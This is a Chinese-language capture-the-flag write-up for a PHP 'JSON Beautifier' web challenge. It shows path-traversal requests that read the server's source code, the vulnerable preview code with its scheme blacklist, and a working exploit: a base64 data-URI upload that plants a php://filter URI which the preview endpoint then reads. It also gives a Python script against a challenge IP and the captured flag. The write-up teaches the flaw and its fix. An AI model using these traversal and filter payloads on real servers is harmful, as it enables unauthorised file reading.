# JSON Beautifier 解题报告

## 0x01 题目概况

- 类型：Web
- 技巧：php://filter 利用、临时文件机制、路径穿越

---

## 0x02 前期探测

打开靶机，主页是一个 JSON 格式化工具。抓包发现两个有效端点：

1. `POST /api/beautify.php` — 提交 JSON 数据，返回一个 preview_id
2. `GET /api/preview.php?file=<filename>` — 读取预览文件

查看 `robots.txt` 发现也指向了 `/api/preview.php`。

测试预览接口的路径穿越：

```
GET /api/preview.php?file=preview_xxx.tmp    → 200 OK
GET /api/preview.php?file=../../etc/passwd   → 403
GET /api/preview.php?file=../index.html      → 404
```

有路径校验，不是直接任意文件读。

---

## 0x03 源码分析

用预览接口的路径穿越读后端代码。由于路径校验允许 `src` 和 `tmp` 两个前缀，通过 `../../var/www/html/src/` 能读到源码：

```
/api/preview.php?file=../../var/www/html/src/api/preview.php
/api/preview.php?file=../../var/www/html/src/api/beautify.php
/api/preview.php?file=../../var/www/html/src/api/config.php
```

### config.php

```php
define('APACHE_DOCROOT', '/var/www/html/src');
define('TMP_DIR', '/tmp/json_preview');
define('SRC_API_DIR', APACHE_DOCROOT . '/api');
define('FLAG_PATH', '/secret/flag');
```

### preview.php 处理流程

```php
$requested = TMP_DIR . '/' . $file;
$real = realpath($requested);

// 必须落在白名单目录内
if (!startsWith($real, $tmpPrefix) && !startsWith($real, $srcPrefix)) {
    out(403, "Forbidden");
}

$content = file_get_contents($real);
$line = trim($content);
$isTmp = startsWith($real, $tmpPrefix) && preg_match('/\.tmp$/', $real);

if ($isTmp) {
    $scheme = schemeOf($line);
    if ($scheme !== null) {
        $deny = ['http', 'https', 'ftp', 'ftps', 'phar', 'expect'];
        if (in_array($scheme, $deny, true)) {
            out(403, "Forbidden scheme");
        }
        $pos = stripos($line, 'resource=');
        if ($pos === false) {
            out(400, "Bad reference");
        }
        $resource = rawurldecode(substr($line, $pos + 9));
        if ($resource !== FLAG_PATH) {
            out(403, "Forbidden resource");
        }
        // 关键：用文件内容作为 URI 再次读取
        $data = @file_get_contents($line);
        echo $data;
    }
}
```

关键点：如果 `.tmp` 文件内容形如 `scheme://...`，会触发**第二次文件读取**，且结果直接输出。

### beautify.php data_uri 模式

```php
if ($previewType === 'data_uri') {
    $prefix = 'data:text/plain;base64,';
    if (strpos($payload, $prefix) !== 0) {
        respond(400, ['error' => 'data_uri must start with: data:text/plain;base64,']);
    }
    $b64 = substr($payload, strlen($prefix));
    $decoded = base64_decode($b64, true);
    file_put_contents($tmpFile, $decoded, LOCK_EX);
}
```

任意 base64 解码后写入临时文件，内容完全可控。

---

## 0x04 利用思路

两条限制：

| 限制 | 内容 |
|------|------|
| Scheme 黑名单 | http, https, ftp, ftps, phar, expect |
| 必须包含 resource= | 且值必须为 /secret/flag |

黑名单漏了 `php://`，所以用 `php://filter` 绕过。构造如下内容写入 `.tmp` 文件：

```
php://filter/read=convert.base64-encode/resource=/secret/flag
```

- scheme 是 `php`，不在黑名单
- `resource=/secret/flag` 满足校验
- php://filter 会把 `/secret/flag` 内容以 base64 返回

---

## 0x05 攻击步骤

### Step 1 写入 payload

对 `php://filter/read=convert.base64-encode/resource=/secret/flag` 做 base64：

```
cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS9zZWNyZXQvZmxhZw==
```

发送：

```json
POST /api/beautify.php
Content-Type: application/json

{
    "data": "data:text/plain;base64,cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS9zZWNyZXQvZmxhZw==",
    "preview_type": "data_uri"
}
```

返回 `preview_file: "preview_xxx.tmp"`。

### Step 2 触发二次读取

```
GET /api/preview.php?file=preview_xxx.tmp
```

此时 preview.php 读到的是 `php://filter/read=...`，触发 `file_get_contents($line)`，返回 base64 编码的 flag。

### Step 3 解码

将返回的 base64 字符串解码即得 flag。

---

## 0x06 Exploit

```python
import base64, requests

HOST = "http://39.105.213.28:49102"

r = requests.post(f"{HOST}/api/beautify.php", json={
    "data": "data:text/plain;base64," + base64.b64encode(
        b"php://filter/read=convert.base64-encode/resource=/secret/flag"
    ).decode(),
    "preview_type": "data_uri",
})
fid = r.json()["preview_file"]

resp = requests.get(f"{HOST}/api/preview.php", params={"file": fid})
flag_b64 = resp.text.strip()
flag = base64.b64decode(flag_b64).decode().strip()
print(flag)
```

---

## 0x07 Flag

```
ISCC{6fhFWkws25rBJmrCdZjp}
```

---

## 0x08 要点复盘

攻击链：`beautify(data_uri)` → 写可控内容到 `.tmp` → `preview.php` 二次读取 `.tmp` 内容作为 URI → `php://filter` 绕过 scheme 黑名单读 flag。

出题人做了三层防御：路径白名单 + scheme 黑名单 + 强制 resource 路径。但黑名单留下了 `php://`，三层防御被一条 php://filter 链全部打穿。实际开发中如果用类似逻辑，应该用 scheme 白名单而非黑名单。
